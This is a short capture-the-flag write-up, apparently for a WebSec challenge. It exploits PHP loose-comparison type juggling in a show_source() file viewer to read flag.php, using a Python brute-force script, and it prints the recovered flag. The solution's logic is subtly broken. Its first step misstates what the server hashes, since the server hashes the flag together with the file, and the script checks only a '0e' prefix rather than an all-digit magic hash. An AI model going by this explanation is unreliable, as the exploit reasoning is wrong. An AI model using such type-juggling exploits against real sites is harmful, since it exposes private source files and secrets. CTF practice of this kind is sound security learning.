```
  <?php
        if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
            $file = $_REQUEST['f'];
            $request = $_REQUEST['hash'];

            $hash = substr (md5 ($flag . $file . $flag), 0, 8);

            echo '<div class="row"><br><pre>';
            if ($request == $hash) {
            show_source ($file);
            } else {
            echo 'Permission denied!';
            }
            echo '</pre></div>';
        }
        ?>
        
```

STEP 1: Find a value $file so that the MD5($file) == $request.[PHP Type juggling, connected by loose comparison (==)] 

STEP 2: 
import sys
import hashlib 
for i in range(10000000):
	val='.'+('/'*i*1000)+'/flag.php'
	mdhas=hashlib.md5(val).hexdigest() 
	if mdhas[0:2]=='0e':
		print val
		sys.exit()
[ "./" , ".//" , ".////" all function in the same manner ]


STEP 3: Input File -> val, Hash-> 0
OUTPUT: 
<?php
$flag = "WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}";

       
